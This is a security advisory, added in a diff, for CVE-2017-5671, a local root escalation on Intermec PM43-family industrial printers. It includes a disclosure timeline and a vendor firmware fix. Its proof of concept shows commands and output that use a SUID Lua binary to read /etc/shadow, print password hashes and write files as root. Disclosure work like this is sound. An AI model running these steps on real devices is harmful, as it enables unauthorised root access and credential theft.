@@ -1,0 +1,140 @@
+# TITLE: Intermec Industrial Printers Local root with Busybox jailbreak
+
+# Date: March 28th, 2017
+# Author: Bourbon Jean-marie (kmkz) from AKERVA company | @kmkz_security
+
+# Product Homepage:
+    http://www.intermec.com/products/prtrpm43a/
+
+# Firmware download:
+    http://www.intermec.com/products/prtrpm43a/downloads.aspx
+
+# Tested on :
+    model: PM43 RFID Industrial printer   
+    firmware version: 10.10.011406
+    kernel: Linux PM43-xxxxxxx 2.6.31 #1 PREEMPT Mon Oct 26 10:49:59 SGT 2015 armv5tejl GNU/Linux
+
+# CVSS: 7.5 (CVSS:3.0/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H)
+# OVE ID: OVE-20170131-0001
+# CVE ID: CVE-2017-5671
+# OSVDB ID: n/a
+ 
+# Thanks:
+    Dany Bach (Rioru) from AKERVA company for the exploitation design during the pentest during which the CVE-2017-5671 was discovered | @DDXhunter
+    Honeywell team which was really reactive (with special thanks to Kevin Staggs) !
+
+# Credits:
+    The security notification that Intermec (Honeywell) sent to all of their dealers: 
+     https://github.com/kmkz/exploit/blob/master/CVE-2017-5671-Credits.pdf 
+  
+# Additional ressource:
+  https://akerva.com/blog/intermec-industrial-printers-local-root-with-busybox-jailbreak/
+ 
+# Affected products:
+    PM23, PM42, PM43, PC23, PC43, PD43 and PC42 printers with versions prior to March 2017
+   
+# Fixes:
+    Download the new firmware version by using the link below:
+    http://epsfiles.intermec.com/eps_files/eps_download/Firmware_P10.11.013310.zip
+
+# Release note:
+    http://apps.intermec.com/downloads/eps_download/Firmware%20Release%20Notes%20x10_11_013310.pdf
+   
+ 
+Intermec (Honeywell) Industrial RFID Printers Local root privilege escalation with Busybox jailbreak
+ 
+I. PRODUCT
+
+PM43/PM43c mid-range industrial RFID printers are ideal for a wide range of applications within the distribution center / warehouse and manufacturing environments.
+ 
+II. ADVISORY
+ 
+Using a bad file permission, it is possible to gain full root privilege on a PM43 industrial printer as well as from the admin account than it-admin which are the two default users on the machine.
+It also permits to gain full privilege resulting on a Busybox jailbreak due to the root access on the system.
+The impact of this exploitation is quite critical due to the sensitive information that are available and impact the recent firmware version release (before  March 12th 2017).
+ 
+III. VULNERABILITY DESCRIPTION
+ 
+The Lua binary rights are too permissive and this one is SUID which conduct to perform this privilege escalation using a basic trick as describe in the next section.
+The default it-admin and/or admin credentials are available in the vendor's documentation and should be modified too.
+
+IV. PROOF OF CONCEPT
+ 
+Following steps can reproduce the privilege escalation once the attacker gain a Busybox shell on the system:
+
+itadmin@PM43-XXXXXXXXXXX /tmp$ find / -perm -g=s -type f 2>/dev/null
+/bin/busybox
+/usr/bin/cfg
+/usr/bin/lua <----- Lua binary with SUID perm.
+/usr/bin/httpd_restore
+/usr/bin/ikev2
+/usr/bin/pwauth
+/usr/bin/functest
+/usr/bin/imecutil
+/usr/bin/httpd_fwupgrade
+/usr/sbin/setkey
+
+We then try to execute a shell command using Lua but it seems that this one is executed with non-root privileges through the Busybox shell:
+
+itadmin@PM43-XXXXXXXXXXX /tmp$ /usr/bin/lua
+Lua 5.1.4  Copyright (C) 1994-2008 Lua.org, PUC-Rio
+> os.execute("id")
+uid=1(itadmin) gid=1(itadmin) groups=1(itadmin),2(admin),3(user)
+
+So we identify that it is possible to read/write files with root privilege on the file system without any restrictions (we will be able to modify the shadow file in order to log in as root later):
+
+// in the Lua interpreter:
+
+> f=io.open("/etc/shadow","rb")
+> print(f)
+file (0x17af0)
+> c=f:read "*a"
+> print(c)
+root:!$1$XPCuiq25$IvWw/kKeomOyQIee8XfTb1:11851:0:99999:7:::
+admin:$1$Ma/qTlIw$PPPTgRVCnkqcDQxjMBtsC0:11851:0:99999:7:::
+itadmin:$1$kcHXJUjT$OIgLfTDgaEAlTbHRZFPsj.:11851:0:99999:7:::
+user::11851:0:99999:7:::
+ftp:*:11851:0:99999:7:::
+nobody:*:11851:0:99999:7:::
+lighttpd:x:1000:1000:Linux User,,,:/home/lighttpd:/bin/sh
+ 
+We conclude this "proof of concept" by writing a file on the filesystem which demonstrate the possibilities that we now have using this kind of code:
+
+fp = io.popen("akerva", "w")
+fp:write(anything)
+fp:close()
+
+That gave us the following output:
+
+itadmin@PM43-XXXXXXXXXXX /tmp$ cat akerva
+AKERVA r00t
+itadmin@PM43-XXXXXXXXXXX /tmp$ ls -alsh akerva
+   4 -rw-rw-r--    1 root     root           12 Jan 25 07:12 akerva
+
+As explained in the above text, we then over-writed the "etc/shadow" file and we validated that it is possible to gain full root access on the filesystem even if Busybox 1.15.0 (2009 release) were present, bypassing
+its shell restrictions (jailbreaking it).
+ 
+V. RECOMMENDATIONS
+
+AKERVA's Pentesters recommended to fix it by modifying the Lua binary rights (is the SUID bit necessary?) which was done in the patched firmware.
+A security fix is now available in order to mitigate this issue as shown at the beginning of this advisory.
+
+VI. VERSIONS AFFECTED
+ 
+This issue affects the firmware version 10.10.011406 but after reading the latest release notes it also seems to impact all versions that were released before the updated firmware.
+ 
+VII. TIMELINE
+ 
+January 19th, 2017: Vulnerability identification
+January 27th, 2017: First contact with the editor (Honeywell)
+January 31th, 2017: Advisory submission to Honeywell security team and CVE id request
+February 1st, 2017: CVE id attributed by MITRE even if the vendor is not normally considered a priority for CVE by MITRE
+February 6th, 2017: Vendor confirm the vulnerability
+February 16th, 2017: Vendor inform that the fix is ready (They also proposed me to test it prior to release)
+March 12th, 2017: New firmware version available
+March 28th, 2017: Public advisory released
+ 
+VIII. LEGAL NOTICES
+ 
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or misuse of this advisory.
